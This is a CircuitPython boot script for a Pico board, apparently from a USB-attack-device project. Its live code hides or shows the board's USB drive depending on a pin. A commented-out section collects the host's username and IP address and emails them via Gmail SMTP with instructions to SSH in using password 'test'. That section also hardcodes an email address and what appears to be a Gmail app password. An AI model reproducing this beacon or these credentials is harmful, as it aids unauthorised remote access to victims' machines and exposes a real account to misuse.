from board import *
import digitalio
import storage
# import smtplib
# from email.mime.multipart import MIMEMultipart
# from email.mime.text import MIMEText
# from email.mime.base import MIMEBase
# from email import encoders
# import socket
# import os







# def get_ip_address():
#     # Create a socket object
#     s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

#     try:
#         # Connect to any remote server (doesn't actually send any data)
#         s.connect(("8.8.8.8", 80))
#         # Get the IP address associated with the socket
#         ip_address = s.getsockname()[0]
#     finally:
#         # Close the socket
#         s.close()

#     return ip_address





# def send_email(sender_email, sender_password, receiver_email, subject, message_body):
#     # Set up the email message
#     msg = MIMEMultipart()
#     msg['From'] = sender_email
#     msg['To'] = receiver_email
#     msg['Subject'] = subject

#     # Attach message body
#     msg.attach(MIMEText(message_body, 'plain'))

#     # Attach PDF file


#     # Connect to SMTP server and send email
#     with smtplib.SMTP('smtp.gmail.com', 587) as server:
#         server.starttls()
#         server.login(sender_email, sender_password)
#         FBI_OPEN_UP="MAY the force be with you \n \n this is "+os.getlogin()+ " with the ip of " +get_ip_address()+" just type::: \n ssh Broo@"+get_ip_address()+" \n the pass is test ofc :)"
#         server.sendmail(sender_email, receiver_email,FBI_OPEN_UP )



# # Set up sender email credentials
# sender_email = "khaled.mrad@ensi-uma.tn"
# sender_password = "pywh domh rlsd vezm"  # foolow the steps in the readme to know hot to get this password (not email password !!!!
# subject = "Subject of the email"
# message_body = "Body of the email"


# send_email(sender_email, sender_password, "khaled.mrad.936@gmail.com", subject, message_body)

# print("Emails sent successfully.")



noStorageStatus = False
noStoragePin = digitalio.DigitalInOut(GP15)
noStoragePin.switch_to_input(pull=digitalio.Pull.UP)
noStorageStatus = not noStoragePin.value

if(noStorageStatus == False):
    # don't show USB drive to host PC
    storage.disable_usb_drive()
    print("Disabling USB drive")
else:
    # normal boot
    print("USB drive enabled")
